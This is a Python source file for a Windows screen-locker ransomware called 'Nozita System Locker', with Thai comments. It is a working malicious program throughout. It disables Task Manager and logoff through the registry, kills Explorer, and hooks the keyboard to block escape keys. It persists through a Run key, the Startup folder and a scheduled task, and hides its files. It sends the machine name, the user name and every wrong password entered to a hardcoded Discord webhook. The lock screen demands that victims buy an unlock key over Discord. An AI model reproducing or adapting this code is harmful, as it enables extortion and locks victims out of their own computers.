import ctypes
import json
import os
import shutil
import subprocess
import sys
import time
import tkinter as tk
from tkinter import messagebox
import urllib.request
import winreg as reg

# ==================== ตั้งค่า Webhook ของคุณที่นี่ ====================
WEBHOOK_URL = "https://discord.com/api/webhooks/1563808728841723974/odH4RUf4JhXo50zEgzMNZh6on10PM598J5wjHnpXkrm7WP_lV5xDJIFCs2eOQTCSbj6a"
# ====================================================================

def send_webhook(title, description, color=0xff3333):
    if WEBHOOK_URL == "https://discord.com/api/webhooks/1563808728841723974/odH4RUf4JhXo50zEgzMNZh6on10PM598J5wjHnpXkrm7WP_lV5xDJIFCs2eOQTCSbj6a" or not WEBHOOK_URL:
        return
    try:
        embed = {
            "title": title,
            "description": description,
            "color": color
        }
        data = {"embeds": [embed]}
        req = urllib.request.Request(
            WEBHOOK_URL,
            data=json.dumps(data).encode("utf-8"),
            headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
        )
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        pass

# ตัวแปรสำหรับป้องกันการส่งแจ้งเตือนรัวเกินไปตอนกดปุ่มคีย์ลัด
last_alert_time = 0
app_hwnd = None  # ตัวเก็บ Handle ของหน้าต่างโปรแกรมสำหรับดึงกลับมาหน้าสุด

def trigger_shortcut_alert(detail):
    global last_alert_time
    current_time = time.time()
    if current_time - last_alert_time > 3:  
        last_alert_time = current_time
        pc_name = os.environ.get("COMPUTERNAME", "Unknown")
        send_webhook(
            "⚠️ Nozita Alert - Shortcut Blocked",
            f"มีความพยายามกดคีย์ลัดห้ามใช้งานบนเครื่อง `{pc_name}`!\nรายละเอียด: `{detail}`",
            0xffaa00
        )

# โครงสร้างสำหรับ Low-Level Keyboard Hook
class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", ctypes.c_ulong),
        ("scanCode", ctypes.c_ulong),
        ("flags", ctypes.c_ulong),
        ("time", ctypes.c_ulong),
        ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong))
    ]

WH_KEYBOARD_LL = 13
hook_id = None

def keyboard_hook_proc(nCode, wParam, lParam):
    global app_hwnd
    if nCode >= 0:
        kbStruct = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
        vkCode = kbStruct.vkCode
        
        blocked = False
        detail = ""

        # บล็อกปุ่ม Windows ซ้าย/ขวา
        if vkCode in (0x5B, 0x5C):
            detail = "กดปุ่ม Windows Key"
            blocked = True
            
        # บล็อก Win + D
        elif vkCode == 0x44:
            if (ctypes.windll.user32.GetKeyState(0x5B) & 0x8000) or (ctypes.windll.user32.GetKeyState(0x5C) & 0x8000):
                detail = "กดปุ่ม Win + D (Minimize All)"
                blocked = True

        # บล็อก Alt + Tab
        elif vkCode == 0x09 and (ctypes.windll.user32.GetKeyState(0x12) & 0x8000):
            detail = "กดปุ่ม Alt + Tab"
            blocked = True
            
        # บล็อก Ctrl + Esc
        elif vkCode == 0x1B and (ctypes.windll.user32.GetKeyState(0x11) & 0x8000):
            detail = "กดปุ่ม Ctrl + Esc"
            blocked = True
            
        if blocked:
            trigger_shortcut_alert(detail)
            if app_hwnd:
                ctypes.windll.user32.ShowWindow(app_hwnd, 9) 
                ctypes.windll.user32.SetForegroundWindow(app_hwnd)
            return 1
            
    return ctypes.windll.user32.CallNextHookEx(hook_id, nCode, wParam, lParam)

def set_system_lockdowns(enable=True):
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        with reg.CreateKey(reg.HKEY_CURRENT_USER, key_path) as key:
            val = 1 if enable else 0
            reg.SetValueEx(key, "DisableTaskMgr", 0, reg.REG_DWORD, val)
            reg.SetValueEx(key, "DisableChangePassword", 0, reg.REG_DWORD, val)
            reg.SetValueEx(key, "DisableLockWorkstation", 0, reg.REG_DWORD, val)
            reg.SetValueEx(key, "NoLogoff", 0, reg.REG_DWORD, val)
    except Exception:
        pass


class NozitaLocker:

    def __init__(self, root):
        global app_hwnd
        self.root = root
        self.root.title("Nozita System Locker")
        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True)
        self.root.protocol("WM_DELETE_WINDOW", self.disable_event)

        self.root.update_idletasks()
        app_hwnd = self.root.winfo_id()

        set_system_lockdowns(True)
        self.kill_explorer()
        self.setup_persistence()
        self.start_hook()

        pc_name = os.environ.get("COMPUTERNAME", "Unknown")
        user_name = os.environ.get("USERNAME", "Unknown")
        send_webhook(
            "  Locker - System Locked",
            f"เครื่อง `{pc_name}` (User: `{user_name}`) ถูกล็อกอย่างหนาแน่นและซ่อนไฟล์ระบบเรียบร้อยแล้ว!",
            0xff3333
        )

        self.root.configure(bg="#0b0b0b")

        title_label = tk.Label(
            root,
            text="NOZITA SYSTEM LOCKED",
            font=("Courier", 36, "bold"),
            fg="#ff3333",
            bg="#0b0b0b",
        )
        title_label.pack(pady=50)

        msg_text = (
            "เครื่องของคุณถูกล็อคโดย X\n\nคุณโดนล็อคโดยเจ้าของเครื่อง กรุณาเข้าสู่ Discord เพื่อซื้อหรือรับคีย์ปลดล็อก :\nhttps://discord.gg/spYTerRcTB"
        )
        msg_label = tk.Label(
            root,
            text=msg_text,
            font=("Arial", 16),
            fg="#ffffff",
            bg="#0b0b0b",
            justify="center",
        )
        msg_label.pack(pady=20)

        self.entry = tk.Entry(
            root, font=("Arial", 20), show="*", justify="center", width=25
        )
        self.entry.pack(pady=30)
        self.entry.focus_set()

        btn = tk.Button(
            root,
            text="UNLOCK SYSTEM",
            font=("Arial", 14, "bold"),
            command=self.check_key,
            bg="#ff3333",
            fg="#ffffff",
            padx=20,
            pady=10,
        )
        btn.pack(pady=10)

        root.bind("<Alt-F4>", lambda e: "break")
        root.bind("<Escape>", lambda e: "break")

        self.enforce_focus()

    def kill_explorer(self):
        try:
            subprocess.run("taskkill /f /im explorer.exe", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass

    def restore_explorer(self):
        try:
            subprocess.run("start explorer.exe", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass

    def disable_event(self):
        pc_name = os.environ.get("COMPUTERNAME", "Unknown")
        send_webhook(
            "⚠️ Nozita Alert - Close Attempt",
            f"มีความพยายามปิดหน้าต่างโปรแกรมล็อกบนเครื่อง `{pc_name}`!",
            0xffaa00
        )
        if app_hwnd:
            ctypes.windll.user32.ShowWindow(app_hwnd, 9)
            ctypes.windll.user32.SetForegroundWindow(app_hwnd)
        pass

    def enforce_focus(self):
        try:
            self.root.lift()
            self.root.attributes("-topmost", True)
            self.entry.focus_set()
        except Exception:
            pass
        self.root.after(300, self.enforce_focus)

    def start_hook(self):
        global hook_id
        try:
            CMPFUNC = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_ulong))
            self.pointer = CMPFUNC(keyboard_hook_proc)
            hook_id = ctypes.windll.user32.SetWindowsHookExW(WH_KEYBOARD_LL, self.pointer, ctypes.windll.kernel32.GetModuleHandleW(None), 0)
        except Exception:
            pass

    def setup_persistence(self):
        try:
            if getattr(sys, "frozen", False):
                current_path = sys.executable
            else:
                current_path = os.path.abspath(__file__)

            persist_dir = os.path.join(os.environ.get("ProgramData", "C:\\ProgramData"), "NozitaGuard")
            os.makedirs(persist_dir, exist_ok=True)
            
            target_filename = "nozita_system.exe" if getattr(sys, "frozen", False) else "nozita_system.py"
            target_path = os.path.join(persist_dir, target_filename)

            if current_path != target_path:
                shutil.copy2(current_path, target_path)
                subprocess.run(f'attrib +h +s "{target_path}"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            subprocess.run(f'attrib +h +s "{persist_dir}"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            # 1. Registry Run Persistence
            key = reg.HKEY_CURRENT_USER
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with reg.OpenKey(key, key_path, 0, reg.KEY_SET_VALUE) as reg_key:
                reg.SetValueEx(reg_key, "NozitaSystemLocker", 0, reg.REG_SZ, f'"{target_path}"')

            # 2. Startup Folder Persistence
            startup_folder = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
            target_startup_path = os.path.join(startup_folder, "nozita_locker.exe" if getattr(sys, "frozen", False) else "nozita_locker.py")
            if not os.path.exists(target_startup_path):
                shutil.copy2(target_path, target_startup_path)
                subprocess.run(f'attrib +h "{target_startup_path}"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            # 3. Task Scheduler Persistence
            task_name = "NozitaSystemGuard"
            subprocess.run(f'schtasks /create /tn "{task_name}" /tr "\"{target_path}\"" /sc onlogon /rl highest /f', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass

    def self_destruct(self):
        pc_name = os.environ.get("COMPUTERNAME", "Unknown")
        send_webhook(
            "🔓 Nozita Locker - Unlocked",
            f"ปลดล็อกสำเร็จ! เครื่อง `{pc_name}` ใช้รหัสผ่านถูกต้อง ระบบกำลังคืนค่า Explorer และทำลายตัวเอง",
            0x00ff00
        )

        set_system_lockdowns(False)
        self.restore_explorer()

        try:
            key = reg.HKEY_CURRENT_USER
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with reg.OpenKey(key, key_path, 0, reg.KEY_SET_VALUE) as reg_key:
                reg.DeleteValue(reg_key, "NozitaSystemLocker")
        except Exception:
            pass

        try:
            startup_folder = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
            for file_name in ["nozita_locker.exe", "nozita_locker.py", "nozita_system.exe", "nozita_system.py"]:
                p = os.path.join(startup_folder, file_name)
                if os.path.exists(p):
                    os.remove(p)
        except Exception:
            pass

        try:
            subprocess.run('schtasks /delete /tn "NozitaSystemGuard" /f', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass

        global hook_id
        if hook_id:
            try:
                ctypes.windll.user32.UnhookWindowsHookEx(hook_id)
            except Exception:
                pass

        persist_dir = os.path.join(os.environ.get("ProgramData", "C:\\ProgramData"), "NozitaGuard")
        if getattr(sys, "frozen", False):
            target_path = sys.executable
        else:
            target_path = os.path.abspath(__file__)

        bat_path = os.path.join(os.environ["TEMP"], "cleanup.bat")
        bat_content = f"""@echo off
timeout /t 2 /nobreak > nul
attrib -h -s "{persist_dir}"
rmdir /s /q "{persist_dir}"
del /f /q "{target_path}"
del /f /q "%~f0"
"""
        try:
            with open(bat_path, "w") as f:
                f.write(bat_content)
            subprocess.Popen(bat_path, shell=True)
        except Exception:
            pass

        self.root.destroy()
        sys.exit(0)

    def check_key(self):
        entered_key = self.entry.get()
        if entered_key == "xwon":
            self.self_destruct()
        else:
            pc_name = os.environ.get("COMPUTERNAME", "Unknown")
            send_webhook(
                "⚠️ Nozita Alert - Wrong Password",
                f"มีคนกรอกรหัสผ่านผิดบนเครื่อง `{pc_name}`!\nรับค่ารหัสที่กรอกคือ: `{entered_key}`",
                0xff0000
            )
            messagebox.showerror(
                "Access Denied",
                "Invalid key! Obtain the correct key from Nozita Discord.",
            )
            self.entry.delete(0, tk.END)


if __name__ == "__main__":
    root = tk.Tk()
    app = NozitaLocker(root)
    root.mainloop()
